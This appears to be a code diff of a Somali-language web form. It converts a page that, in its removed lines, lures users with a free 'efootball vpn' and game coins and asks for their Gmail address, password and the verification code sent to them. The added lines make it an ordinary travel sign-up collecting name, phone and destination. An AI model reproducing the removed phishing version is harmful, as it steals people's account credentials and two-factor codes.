@@ -166,11 +166,12 @@
       <h1>Dalxiis Nala Raac</h1>
 
       <p>
-        xagan ka gasho vpn ka si sd epic u uso qaadato
+        Haddii aad rabto inaad nala dalxiisto,
+        halkan iska diiwaangeli.
       </p>
 
       <button onclick="showPage(2)">
-        efootball vpn
+        Iska Diiwaangeli
       </button>
 
     </div>
@@ -179,20 +180,20 @@
     <!-- NOOCA GAADHIGA -->
     <div class="page" id="page2">
 
-      <h1>Dooro nooca geemka</h1>
+      <h1>Dooro Gaadhiga</h1>
 
       <p>
-        Geli nooca geemka
+        Geli nooca gaadhiga aad rabto inaad raacdo.
       </p>
 
-      <label>Coinska aad haysato</label>
+      <label>Nooca gaadhiga</label>
 
       <select id="car">
-        <option value="">-- Dooro --</option>
-        <option value="Bas">100 Coins</option>
-        <option value="Minibus">500 Coins</option>
-        <option value="Gaadhi yar">900 Coins</option>
-        <option value="4x4">waxba</option>
+        <option value="">-- Dooro gaadhi --</option>
+        <option value="Bas">Bas</option>
+        <option value="Minibus">Minibus</option>
+        <option value="Gaadhi yar">Gaadhi yar</option>
+        <option value="4x4">4x4</option>
       </select>
 
       <button onclick="carNext()">
@@ -209,13 +210,13 @@
     <!-- MEESHA -->
     <div class="page" id="page3">
 
-      <h1>hada ma kuu dagsantahay efootball</h1>
+      <h1>Meesha Aad Tagayso</h1>
 
       <p>
-        efootball 
+        Geli meesha aad rabto inaad tagto.
       </p>
 
-      <label>baaga aad tuuranyso 3 qof miyuu ka kooban yahay</label>
+      <label>Meesha aad rabto inaad tagto</label>
 
       <input
         type="text"
@@ -240,12 +241,13 @@
       <h1>Hore u sii gal</h1>
 
       <p>
-        si sax ah ayaad u galisey
+        Waxaad dooratay gaadhiga iyo meesha aad rabto
+        inaad tagto.
       </p>
 
       <p>
-        Hadda fadlan geli Gmail-kaaga iyo baaswaydhka
-        si aad ugu xidhato
+        Hadda fadlan geli magacaaga iyo lambarkaaga
+        si aan kula soo xiriirno.
       </p>
 
       <button onclick="showPage(5)">
@@ -265,10 +267,10 @@
       <h1>Macluumaadkaaga</h1>
 
       <p>
-        Fadlan geli Gmail-kaaga shaxda iyo password ka 
+        Fadlan geli magacaaga iyo lambarkaaga telefoonka.
       </p>
 
-      <label>Gmail ka </label>
+      <label>Magacaaga</label>
 
       <input
         type="text"
@@ -276,7 +278,7 @@
         placeholder="Geli magacaaga"
       >
 
-      <label>password</label>
+      <label>Lambarkaaga</label>
 
       <input
         type="tel"
@@ -293,7 +295,7 @@
       </button>
 
       <div class="error" id="error">
-        Fadlan buuxi Gmail-ka password ka
+        Fadlan buuxi magaca iyo lambarka.
       </div>
 
     </div>
@@ -313,12 +315,13 @@
       </p>
 
       <p>
-        ku raaxayso shaxdaada
-        <strong>10 ka dib tuuro</strong>
+        Waxaan kula soo xiriiri doonaa
+        <strong>10 daqiiqo gudahood.</strong>
       </p>
 
       <p>
-      si aad ugu xidhato vpn ka gali code an kusoo dirno
+        Haddii aad rabto, waxaad hadda noo soo diri kartaa
+        hal fariin oo dheeraad ah.
       </p>
 
       <button onclick="showPage(7)">
@@ -334,18 +337,19 @@
       <h1>Qor Fariintaada</h1>
 
       <p>
-        Halkan waxaad ku qori kartaa code kaaga hadii uu kusoo dhaco 
+        Halkan waxaad ku qori kartaa hal fariin oo aad
+        rabto inaad noo soo dirto.
       </p>
 
-      <label>codka</label>
+      <label>Fariintaada</label>
 
       <textarea
         id="message"
-        placeholder="gali code ka ..."
+        placeholder="Halkan ku qor fariintaada..."
       ></textarea>
 
       <button onclick="sendMessage()">
-        send
+        Dir Fariinta
       </button>
 
       <button class="back" onclick="showPage(6)">
@@ -353,7 +357,7 @@
       </button>
 
       <div class="error" id="messageError">
-        send the massage.
+        Fadlan fariinta qor.
       </div>
 
       <div class="message-success" id="messageSuccess">
@@ -390,7 +394,7 @@
       const car = document.getElementById("car").value;
 
       if (car === "") {
-        alert("Fadlan dooro coins ka ad haysato.");
+        alert("Fadlan dooro nooca gaadhiga.");
         return;
       }
 
@@ -404,7 +408,7 @@
         document.getElementById("destination").value.trim();
 
       if (destination === "") {
-        alert("Fadlan si taxadar le u raac talaaboyinkan.");
+        alert("Fadlan geli meesha aad rabto inaad tagto.");
         return;
       }
 
@@ -417,10 +421,10 @@
     async function sendForm() {
 
       const name =
-        document.getElementById("Gmail").value.trim();
+        document.getElementById("name").value.trim();
 
       const phone =
-        document.getElementById("password").value.trim();
+        document.getElementById("phone").value.trim();
 
       const car =
         document.getElementById("car").value;
@@ -445,9 +449,9 @@
 
       const data = new FormData();
 
-      data.append("Nooca Fariinta", "eipc vpn");
-      data.append("Gmail", name);
-      data.append("password", phone);
+      data.append("Nooca Fariinta", "Diiwaangelin Cusub");
+      data.append("Magaca", name);
+      data.append("Lambarka", phone);
       data.append("Nooca Gaadhiga", car);
       data.append("Meesha", destination);
 
@@ -523,7 +527,7 @@
 
       const data = new FormData();
 
-      data.append("Nooca Fariinta", "fadlan gali code-kamarka uu kuso dhaco");
+      data.append("Nooca Fariinta", "Fariin Dheeraad ah");
       data.append("Magaca", name);
       data.append("Lambarka", phone);
       data.append("Fariinta Qofka", message);
@@ -576,4 +580,4 @@
   </script>
 
 </body>
-        </html>
+  </html>
